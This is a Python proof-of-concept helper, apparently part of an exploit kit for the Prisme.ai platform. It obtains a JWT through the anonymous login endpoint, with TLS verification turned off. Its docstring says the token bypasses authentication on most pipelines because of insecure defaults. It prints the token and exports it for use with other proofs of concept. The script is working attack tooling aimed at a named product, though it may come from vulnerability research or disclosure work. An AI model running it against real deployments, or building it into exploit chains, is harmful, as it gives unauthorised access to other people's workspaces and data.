#!/usr/bin/env python3
"""
Prisme.ai Anonymous Auth Helper

Obtains a valid JWT token via POST /login/anonymous — no credentials needed.
The anonymous token bypasses authentication on most pipelines since
allowAnonymousUsers defaults to true, and the workspaces pipeline
uses allowApiKeyOnly which skips auth entirely.

Usage:
  # As a module
  from auth_helper import get_anonymous_token
  token, user_id, session_id = get_anonymous_token("https://dev.example.com")

  # Standalone
  python3 auth_helper.py --target https://dev.example.com
"""

import argparse
import requests
import json
import urllib3
urllib3.disable_warnings()


def get_anonymous_token(base_url, expires_after=86400):
    """
    Get a JWT token via anonymous login.

    Returns: (token, user_id, session_id) or (None, None, None) on failure.
    """
    url = f"{base_url.rstrip('/')}/v2/login/anonymous"
    headers = {"Content-Type": "application/json"}
    payload = {"expiresAfter": expires_after}

    try:
        r = requests.post(url, headers=headers, json=payload, verify=False, timeout=15)
        if r.status_code == 200:
            data = r.json()
            token = data.get("token")
            user_id = data.get("id")
            session_id = data.get("sessionId")
            return token, user_id, session_id
        else:
            # Try without /v2 prefix
            url2 = f"{base_url.rstrip('/')}/login/anonymous"
            r2 = requests.post(url2, headers=headers, json=payload, verify=False, timeout=15)
            if r2.status_code == 200:
                data = r2.json()
                return data.get("token"), data.get("id"), data.get("sessionId")
            return None, None, None
    except Exception as e:
        print(f"  [ERROR] Anonymous auth failed: {e}")
        return None, None, None


def main():
    parser = argparse.ArgumentParser(description="Prisme.ai Anonymous Auth")
    parser.add_argument("--target", required=True, help="Base URL")
    parser.add_argument("--expires", type=int, default=86400, help="Token TTL in seconds (default: 86400)")
    args = parser.parse_args()

    base = args.target.rstrip("/")
    print(f"[*] Target: {base}")
    print(f"[*] Requesting anonymous token...")

    token, user_id, session_id = get_anonymous_token(base, args.expires)

    if token:
        print(f"\n[+] SUCCESS — Anonymous token obtained!")
        print(f"  User ID:    {user_id}")
        print(f"  Session ID: {session_id}")
        print(f"  Token:      {token[:80]}...")
        print(f"\n  Export for use with PoCs:")
        print(f"  export PRISME_TOKEN='{token}'")
        print(f"  export PRISME_USER_ID='{user_id}'")
    else:
        print(f"\n[-] FAILED — Could not obtain anonymous token")
        print(f"  Anonymous auth may be disabled or endpoint path differs")


if __name__ == "__main__":
    main()
